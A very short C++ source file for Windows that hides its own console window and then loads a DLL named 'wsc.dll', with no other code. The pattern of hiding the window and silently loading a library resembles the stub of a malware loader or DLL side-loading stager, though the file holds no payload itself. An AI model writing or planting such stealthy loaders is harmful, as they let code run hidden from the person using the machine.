#include <iostream>
#include <windows.h>
#include <WinUser.h>

int main(){
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	HMODULE hModule = LoadLibrary("wsc.dll");

	return 0;
}